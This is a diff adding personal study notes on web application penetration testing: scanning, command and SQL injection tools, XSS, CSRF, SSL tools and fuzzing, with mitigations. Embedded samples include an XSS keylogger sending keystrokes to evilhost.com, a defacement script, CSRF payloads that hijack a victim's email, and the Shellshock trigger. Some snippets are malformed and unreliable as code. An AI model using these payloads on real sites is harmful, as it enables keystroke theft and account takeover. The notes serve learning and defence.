@@ -1,0 +1,404 @@
+WEB APP SECURITY ESSENTIALS
+
+1. CHECK FOT THE TYPE OF METHOD USED AFTER CREDENTIALS ARE ENTERED.
+   USER-ENTERED INPUT i.e. CREDENTIALS,PIN ETC. SHOUULD BE ACCEPTED USING 'POST' METHOD,NEVER BY 'GET' METHOD AS THE CREDENTIALS BECOME A PART OF URL.IN 'POST' METHOD, CREDENTIALS,SESSION ID BECOME A PART OF THE BODY,MAKING IT SECURE FROM TAMPERING.
+
+2. MORE INFORMATION IN THE HEADER,MORE INFORMATION RETRIVED BY ATTACKER.
+
+3. HTTPONLY- PARAMETER SET IN COOKIE TO MITIGATE THE RISK POSED BY XSS AS JAVASCRIPT WON'T BE ABLE TO ACCESS THE COOKIE.
+   SECURE-IF SET,THE COOKIE IS ONLY SENT OVER SSL.
+
+4. RECON-NG
+
+5. NMAP COMMANDS
+   i.ACK SCAN
+   ii.nmap -O 
+   iii.nmap -sV IP ==>VERSION SCAN OF THE SERVICE RUNNNING ON THE PORTS.
+NOTE: OS AND VERSION SCAN CAN BE COMBINED BY USING "nmap -A IP"
+
+6.WHATWEB SCANNER ==> TOOL TO IDENTIFY DIFFERENT WEB TECHNOLOGIES USED BY THE WEBSITE
+
+7.DNS tools such as dig and nslookup can be used to identify domains returning similar IP addresses.
+
+8.Hardware load balancers are the ones that are used today to route traffic to websites maintaining load across multiple WEB SERVER
+
+9. OWAASP MUTILLIDAE DOWNLOAD LINK:http://sourceforge.net/projects/owaspbwa
+
+10. WAYS IN WHICH SESSION TOKEN IS PASSED BETWEEN APPLICATION AND WEB BROWSER:
+     i.PASSING SESSION TOKEN IN THE URL
+     ii. USING HIDDEN FORM FIELDS
+     iii.USING THE SET-COOKIE FIELD IN THE HEADER
+11. MITIGATIONS OF SESSION FIXATION
+   i.SESSION ID MUST BE SET USING A COOKIE.
+   Setting a cookie on the browser of another user is difficult unless the application itself is vulnerable to a flaw such as cross-site scripting, through which the attacker can set a cookie in the user's browser.
+
+   ii.DESIGN THE APPLICATION TO REJECT ANY USER SUPPLIED SESSION ID.
+      It is the responsibility of the server to create random session IDs and any user supplied IDs should be discarded
+
+   iii.Another mitigation step is to implement concurrency control
+
+    iv.To properly manage session tokens, use tried and tested frameworks such as PHP and .NET, which have built-in mechanism for sending and handling session tokens.
+
+12. HTTP PARAMETER POLLUTION--> BEING ABLE TO ALTER THE PARAMETERS PRESENT IN HTTP GET AND POST REQUEST.
+    MITIGATIONS:
+    i.PROPER INPUT VALIDATION WHICH MAKES IT OVERWRITE HARDCODED VALUES.
+    ii.Whitelisting expected parameters and their values should be included in the application logic and the input from the user should be sanitized against it.
+    iii.Web application firewalls that have been tuned to understand the flaw that can track multiple occurrences of the variable should be used to handle filtering
+
+13. HTTP RESPONSE SPLITTING.
+    \r => CARRIAGE RETURN 
+    \n => LINE FEED
+    BOTH CAN BE USED TO CREATE ADDITIONAL FIELDS IN HTTP HEADER.
+
+   MITIGATIONS: PROPER INPUT VALIDATION(KEY FACTOR) AND METACHARACTERS SUCH AS CR AND CL MUST BE REMOVED BEFORE PLACING VALUES IN HTTP RESPONSE HEADER
+
+14.INJECTION FLAWS
+   
+   COMMAND INJECTIONS:USING SCRIPTS TO INVOKE SOME FUNCTIONALITY IN COMMAND LINE ON THE WEB SERVER TO PROCESS THE INPUT RECEIVED FROM THE USER.
+
+   PARAMETERS TO BE CHECKED FOR COMMAND INJECTION FLAWS:
+   i.GET METHOD:input parameters are sent in URLs.the input from the client was passed to the server using GET method and was vulnerable to a command injection flaw.Any user-controlled parameter sent using the GET method request should be tested.
+   ii.POST METHOD:In this method, input parameters are sent in HTTP body. Similar to the input been passed using the GET method, data taken from the end user can also be passed using the POST method in the body of the HTTP request. This could then be used by the web application to build a command query on the serber side.
+   iii.HTTP HEADERS:Applications often use header fields to identify end users and display customized information to the user depending on the value in the headers. These parameters could also be used by the application to build further queries. Some of the important header fields to check for command
+       injection are:
+     °° Cookies
+     °° X-Forwarded-For
+     °° User-agent
+     °° Referrer
+
+15.ERROR BASED AND BLIND COMMAND INJECTION
+   As an ethical hacker,the most reliable and safe way to identify the existence of injection flaw when the application does not display the results is using the ping command.
+   THIS MAY PROVE TO BE USEFUL IN SEVERAL WAYS:
+   • Since the ping command is similar in both Linux and Windows, except for a few changes, the command is sure to run if the application is vulnerable to the injection flaw.
+   • By analysing the response in the ping output, the attacker can also identify the underlying OS using the TTL values.
+   • It may also give the attacker some insight on the firewall and its rules, as the target environment is allowing ICMP packet through its firewall. This may prove to be useful in the later stages of exploitation, as the web server has a route to the attacker.
+   • The ping utility is usually not restricted; even if the application is running under a non-privileged account, your chances of getting the command executed is guaranteed.
+   • The input buffer is often limited in size and can only accept a finite number of characters, for example, the input field for the username. The ping command, along with the IP addresses and some additional arguments can easily be injected in these fields.
+
+16.TOOL FOR SCANNING COMMAND INJECTION:
+   WAPITI:SUPPORTS INJECTIONS USING 'GET' AND 'POST' METHODS.BY INJECTING DATA,IT CAN DETECT FOLLOWING VULNERABILITES:
+   • Command injection: This involves injecting data into forms to exploit the eval and system function calls 
+   • XSS: This involves injecting scripts into forms to test for cross-site scripting flaws
+   • CRLF: This involves injecting data in the HTTP header to test for response splitting and session fixation
+   • SQL injection: This involves identifying both blind and error-based SQL injection flaws by using various techniques to inject data
+
+17.The important options that are used by the tool are as follows:
+Options     Description
+-f          Output format (html, txt, or xml)
+-o          Name and folder to save the output file
+-v          Verbosity level (recommended value is 2)
+-m          Modules to select (crlf, exec, xss, or sql)
+-c          Path of cookie file
+
+18. Following are some of the activities that can be performed by exploiting a command injection flaw:
+• Viewing file on the web server
+• Deleting files on the web server
+• Attacking other machines on the internal network of the organization
+• Completely owing the web server
+
+19. ENTER PAGE 135 TO UNDERSTAND PHP SHELL AND METASPLOIT.
+
+20. SHELLSHOCK VULNERABILITY
+
+() { :; };
+When the bash shell receives the preceding set of characters along with the variable, instead of rejecting the strings, the bash shell accepts it along with the variables following it and executes it as a command on the server.
+The bash shell interprets the variable as a command and executes it, instead of accepting the variable as a sequence of characters.
+
+21. SQL STATEMENTS
+Statement    Description
+SELECT       It allows information to be retrieved from the database
+UPDATE       It allows modification of existing data in the database
+INSERT       It allows inserting new data in the database
+DELETE       It can remove data from the database
+
+22. UNION STATEMENT==> COMBINES THE RESULTS OF TWO STATEMENTS INTO ONE SET
+NOTE:IT CAN BE USED ONLY WHEN THE NUMBER OF COLUMNS AND DATA TYPE IN BOTH THE QUERIES MUST BE SAME
+
+To find the exact number of columns in the table of the first query, we can use the ORDER BY statement and ask the database to display results sorted by the column number. If the column number in the ORDER BY statement is larger than the number
+of columns in the table, an error will be returned. Using this error, you can determine the number of columns using trial and error method. The command is as follows:
+ 
+SELECT name,location,age FROM contractors ORDER BY 5
+
+23.SCAN FOR SQL INJECTIONS: inspect input fields in HTML forms, script parameters in URL query strings, values stored in cookies, and hidden fields. 
+Once these fields are identified, we need to fuzz data into them fields by injecting metacharacter, SQL statements, operators, and reserved words.
+
+An Apache web server on Linux is more likely to use the MySQL database rather than an MS SQL database.
+mysql_version auxiliary module to find the exact version of MySQL database
+
+24.SQLMAP
+If the parameter to be injected is passed using the POST method, an HTTP file can be provided as an input to sqlmap that contain the header and the parameter.
+The HTTP file can be generated using a proxy such as Burp by copying the data displayed under the Raw tab when the traffic is captured.
+
+Using sqlmap, you can read and write files on the database server by exploiting the injection flaw, which invokes the load_file() and out_file()
+
+A few additional options provided by the sqlmap tool are shown in the following table:
+Option            Description
+-f                Performs extensive fingerprint of the database
+-b                Retrieves the DBMS banner
+--sql-shell       Accesses the SQL shell prompt after successful exploitation
+--schema          Enumerates the database schema
+--comments        Searches for comments in the database
+--reg-read        Reads a Windows registry key value
+--identify-waf    Identifies WAF/IPS protection
+
+An extensive list of all the options that you can use with sqlmap can be found in the following GitHub project page: https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+25.BBQSQL ==> BLIND SQL INJECTION TOOL
+MENU DRIVEN TOOL.ASKS SEVERAL QUESTIONS AND BUILDS THE ATTACK BASED ON RESPONSE
+
+26.Sqlsus – MySQL injection
+Sqlsus is a tool specifically created to test for MySQL injection flaws. It is written in Perl, unlike sqlmap, which is written in Python.
+It uses stacked subqueries and an intelligent injection algorithm that improves your chances of exploiting the injection flaw.
+
+27.Sqlninja – MS SQL injection
+The sqlninja tool can help you exploit SQL injection flaws on an application using Microsoft SQL server as the backend database. The ultimate aim of using the sqlninja 
+tool is to gain control over the database server through a SQL injection flaw.
+
+Here are some of the important features of sqlninja:
+• Fingerprinting of the remote SQL server to identify the version, user privileges, and database authentication mode and xp_cmdshell availability
+• Uploading executables on target via SQLi
+• Integration with Metasploit
+• Uses the WAF and IPS evasion techniques by using obfuscated code
+• Shell tunnelling using DNS and ICMP protocols
+• Brute forcing of 'sa' password on older versions of MS SQL
+
+28.Defence against DOM-based XSS
+Since the malicious payload in DOM-based XSS does not hit the server, it is not possible to detect it using server-side validation techniques. The problem still exists
+in the way the application is programmed, but the fault lies in the client-side code. One of the key defence methods is to avoid building the HTML page using clientside data.
+
+At times, it would not be possible to avoid user input in client-side code, so the best defence against DOM-based XSS is to avoid using risky HTML and JavaScript methods.
+
+
+29.A sample script that would log all keystrokes is shown here:
+<script>
+document.onkeypress = function(e)
+var img = new Image();
+img.src='http://www.evilhost.com/keylogger.php?data='+e.which;
+</script>
+
+Whenever the user presses a key, the onkeypress event is triggered. In the preceding script, an object by the name e is created for every key that is pressed.
+The which keyword is a property of the object e, which stores the key code of the key that is pressed.
+
+30.Website defacing
+Website defacing is an attack on the website that changes the visual appearance of the website. These attacks are mostly done by hacktivists who want to promote their
+agenda. The document.body.innerHTML property allows JavaScript to manipulate the contents of the loaded HTML page.
+
+By injecting the following script, the contents of the current page will be replaced with the THIS WEBSITE IS UNDER ATTACK text:
+<script>
+document.body.innerHTML="<div style=visibility:visible;><h1>THIS
+WEBSITE IS UNDER ATTACK</h1></div>";
+</script>
+
+31.ZED ATTACK PROXY
+ZAP works by default as a passive proxy; it won't actively intercept traffic unless you set a breakpoint on the URL for which you want to intercept the request and response.
+
+32.AUTOMATED TOOLS TO FIND XSS:
+ZAP,XSSER,W3AF.
+
+XSSER:The important command line options are shown in the following table:
+Option       Use
+-u          This is used specify a target URL
+-g          This is used to inject script in the GET parameter specified
+-p          This is used to inject script in the POST parameter specified
+--heuristic This tries to identify which characters are filtered by the application
+--cookie    This sets a cookie to the HTTP request
+-s –v       These options will display statistical information and verbose output.
+
+33.In a CSRF attack, the attacker makes use of the fact that the user is already authenticated to the application and anything the client sends will be regarded
+by the server as legitimate action.
+CSRF can exploit every web application function that requires a single request within an authenticated session, if sufficient defense is not implemented. Here are some of
+the actions that attackers perform through a CSRF attack:
+• Changing user details such as e-mail address and date of birth in a web application
+• Making fraudulent banking transactions
+• Fraudulent upvoting and downvoting on websites
+• Adding items in the cart without the user's knowledge on an e-commerce website
+
+34.Attack dependencies
+Successfully exploiting the CSRF flaw depends on several variables:
+• Since CSRF leverages an authenticated session, the victim must have an active authenticated session against the target web application. The application should also allow 
+transactions within a session without asking for reauthentication.
+• CSRF is a blind attack and the response from the target web application is not sent to the attacker but the victim. The attacker must have knowledge 
+about the parameters on the website that would trigger the intended action. For example, if you want to change the registered e-mail address of the victim on the website, 
+as an attacker you would have to identify the exact parameter that you need to manipulate to make the changes. Therefore, the attacker
+would require proper understanding of the web application, which can be done by interacting with the web application directly.
+• The attacker needs to find a way to trick the user to click on a preconstructed URL or to visit an attacker controlled website if the target application is using
+the POST method. This can be achieved using a social engineering attack.
+
+35.Attack methodology
+The third point in the attack dependencies discussed in the preceding section requires the victim browser to submit a request to the target application without
+his or her victim's knowledge. It can be achieved using several ways:
+• Image tag is one the most common way to achieve it and is often used to demonstrate a CSRF vulnerability. The attack methodology would be the attacker tricking the victim to visit a 
+website under his or her control. A small image is loaded on that website, which would be performing the fraudulent transaction on behalf of the victim. The following code is one such example:
+<imgsrc=http://vulnerableapp.com/userinfo/edit.php?email=evil@
+attacker.com height="1" width="1"/>
+
+The height and the width of the image is set to only 1 pixel; therefore, even when the image source is not a legitimate image, the victim won't be able to
+identify it. The e-mail address of the user in the application gets updated to evil@attacker.com. This technique only works for the GET requests.
+
+• The same technique can be used using the script tag. The script executes when the evil website is loaded on the user's browser and it performs the transaction behind the scenes.
+
+• For a website using the POST method, the steps are more difficult. The attacker would have to use a hidden Iframe and load a form in it, which would execute the desired function 
+on the vulnerable web application.An example is shown here:
+<iframe style=visibility:"hidden" name="csrf-frame"
+></iframe>
+<form name="csrf"
+action=""http://vulnerableapp/userinfo/edit.php"
+method="POST" target="csrf-frame"
+<input type="hidden" name="email"
+value="evil@attacker.com">
+<input type='submit' value='submit'>
+</form>
+<script>document.csrf.submit();</script>
+
+A very important point to keep in mind is that same origin policy does not prevent the browser from submitting a form across domain. It only prevents
+scripts from accessing data across domains.
+
+36.most of the automated scanners test for the following things to confirm the existence of a CSRF flaw in the URL:
+• Checks for common anti-CSRF token names in the request and response
+• Tries to infer if the application is checking the referrer field by supplying a
+fake referrer
+• Creates mutants to check whether the application is correctly verifying the token value
+• Checks for tokens and editable parameters in the query string
+
+37.OWASP CSRFTester project. Here are the steps to use the tool:
+1. Download the tool from https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project. The instructions for the tool are provided on the same page.
+2. Record the transaction that you want to test for CSRF using the inbuilt proxy feature of the tool.
+3. Using the captured data, edit the parameters and their values that you uspect of been vulnerable to CSRF.
+4. The CSRFtester tool would then create a HTML file. Use this HTML file to build an attack using the methodology discussed earlier.
+The pinata-csrf-tool hosted at https://code.google.com/p/pinata-csrf-tool/ is another tool that we often use to create POCs for CSRF flaws.
+
+38.CSRF mitigation techniques.
+Here, we will discuss a few mitigation techniques for the CSRF attack:
+1. CSRF attack is easier to execute when the vulnerable parameter is passed through the GET method. Therefore, avoid it in the first place and use the 
+POST method wherever possible. It does not fully mitigate the attack but makes the attacker's task difficult.Chapter 6[ 189 ]
+2. In the attack methodology we discussed, the attacker creates a new web page and embeds a HTML form in it, sending requests to the vulnerable
+application. HTTP referrer is sent by the browser whenever a client is directed to a specific page. If the application is designed to check the HTTP
+Referrer field, it could prove to be a useful defence as it will drop the connection since it was not referred by a URL in the same domain.
+3. Before executing a critical task, make use of captcha because a user would have to manually pass the test to continue further.
+4. Implementing unique anti-CSRF tokens for each HTML form as the attacker would be unaware of the unique value of the token.
+5. Critical websites should be protected with short session timeout values.The shorter the session, the less chance the attack would be successful
+because the victim would not be logged in the application to execute the attack.
+
+39.In Internet Explorer, the list of trusted CAs can be viewed by navigating to Tools | Internet options | Content | Certificates | Trusted Root Certification Authorities:
+
+40.CRYPTOGRAPHY
+i.SYMMETRIC KEY 
+ii.ASSYMMETRIC KEY
+
+41.FOR EG.: ECDHE-RSA-RC4-MD5. 
+The format is broken down into the following parts:
+• ECDHE: This is a key exchange algorithm
+• RSA: This is an authentication algorithm
+• RC4: This is an encryption algorithm
+• MD5: This is a hashing algorithm
+
+42.SSLSCAN
+i.The cipher suites supported by the client can be identified by running the following command. It will display a long list of supported ciphers by the client:
+
+sslscan –show-ciphers www.example.com:443
+
+ii.If you want to analyse the certificate-related data, use the following command that would display detailed information of the certificate:
+sslscan --show-certificate --no-ciphersuites www.amazon.com:443
+
+The output of the command can be exported in an XML document using the –xml=<filename> option.
+
+43.SSL MITM tools in Kali Linux
+• SSLsplit
+• SSLstrip
+• SSLsniff
+
+44.SOCIAL ENGINEERING TOOLKIT
+i.SPEAR-PHISHING ATTACKS:This module allows you to create customized e-mails to target specific victims.
+The aim of this module is to integrate a payload into the attachment and send it across to the victim via a spoofed e-mail.
+
+45.JAVA APPLET ATTACK
+The Java applet attack method creates a Java applet infected with a malicious payload. The payload is a shell or meterpreter code that provides shell access to the
+victim's machine. To build a complete attack, the tool will prompt if you want to clone a website that you know the victim would trust and spend time browsing on. 
+The applet is then loaded on to the cloned website.
+
+46.WEBSITE ATTACK
+The following methods are included in the social engineering toolkit:
+• Java applet attack
+• Credential Harvester attack
+• Web jacking attack
+• Metasploit browser exploit
+• Tabnabbing attack
+
+47.BeEF ==> EXPLOITATION FRAMEWORK
+
+48.The MITMf tool does not come installed with Kali Linux. It has to be installed sseparately using the following command:
+apt-get install mitmf
+
+49.AJAX CRAWLING TOOLS
+1. Download the AJAX crawling tool from the following URL:
+https://code.google.com/p/fuzzops-ng/downloads/list
+2. After downloading, start it from the bash shell using the following command:
+java –jar act.jar
+
+50.WEB SEVICES
+i.SOAP
+ii.REST
+
+Although SOAP-based web services are recommended in some cases due to the extra security specifications, the lightweight RESTful web service is the preferred method of many
+developers due to its simplicity. SOAP is a protocol, whereas REST is an architectural style.
+
+The major advantage that SOAP has over REST is that SOAP is transport independent, whereas REST works only over HTTP. REST is based on HTTP, and
+therefore the same vulnerabilities that affect a standard web application could be used against it.
+
+The complexity involved in developing SOAP services where the XML data is wrapped in a SOAP request and then sent using HTTP forced many organizations
+towards REST services. It also needed a WSDL file that provided information related to the service. A UDDI directory had to be maintained where the WSDL file is published.
+The basic idea of a RESTful service is, rather than using a complicated mechanism such as SOAP it directly communicates with the service provider over HTTP
+without the need of any additional protocol. It uses HTTP to create, read, update, and delete data.
+
+51.page 254 of pdf
+
+52.Most web services use the following four verbs:
+     HTTP verb     Use
+     GET         To retrieve data
+     PUT         To insert data
+     POST        To update data
+    DELETE       To remove data
+
+53.FUZZING
+Fuzzing is a testing mechanism that sends malformed data to a software implementation. The implementation may be a web application, thick client, or a process running on a server.
+It is a black box testing technique that injects data in an automated fashion. Fuzzing can be used for general testing but is mostly used for security testing.
+Fuzzing often reveals serious flaws in the application. Fuzzing with random data can cause a program to crash, which could result in a denial of service attack. The results
+of the fuzzing test depend on the ability of the fuzzing software to produce inputs that can trigger an exception in the application.
+
+54.• Fuzzing tests the application by emulating an end user, so it gives accurate results
+• Fuzzing tests can find out flaws located in the application that are often ignored by the developers
+
+55.Fuzzing also has some disadvantages:
+• When software crashes during automated fuzzing, it may be difficult to identify where exactly the flaw was detected.
+• Software crashing does not necessarily lead to an exploitable condition; you need to further test to ascertain how the flaw can be exploited.
+• Fuzzing test relies heavily on the quality of the input to test various conditions in the application. If it's just random data, it is no different than
+a brute force attack. Applications that are complex and large in size will require a well-designed fuzzer for complete code coverage.
+
+56.Types of fuzzing techniques
+Fuzzing can be broadly categorized as smart and dumb fuzzing. In technical terms, it is known as Mutation fuzzing and Generation fuzzing.
+
+57.Mutation fuzzing
+Mutation fuzzing, or Dumb fuzzing, employs a faster approach using sample data, but it lacks understanding of the format and structure of the desired input. Using
+Mutation fuzzing, you can create your fuzzer without much effort. The Mutation fuzzing technique uses a sample input and mutates it in a random way. For each
+fuzzing attempt, the data is mutated resulting in different input on subsequent fuzzing attempts.
+
+58.Generation fuzzing
+Generation-based fuzzer, or intelligent fuzzer as it is more commonly known, takes a different approach. These fuzzers have an understanding of the format and structure
+of the data that the application accepts. It generates the input from scratch based on that format. Generation-based fuzzers require prior understanding and intelligence
+in order to build the input that makes sense to the application.
+
+59.File fuzzing
+Attackers are increasingly using client-side attacks. Sending malicious Word documents, PDF files, and images are a few tricks that the attacker may use. In file
+fuzzing, you intentionally send a malformed file to the software and test its behavior.The software crashing as the file is opened might indicate the presence of the
+vulnerability.
+
+60.FUZZER FRAMEWORKS
+i.SULLEY
+ii.SPIKE
+iii.PEACH
+
+SULLEY FUZZING FRAMEWORK IS A feature rich and consists of additional components that are not usually found in fuzzers.
+
+It not only creates data representation but also monitors the target to locate the exact crash condition. It uses something known as gents to monitor the health of the target 
+under fuzzing conditions and resets the target after fuzzing is complete.
+
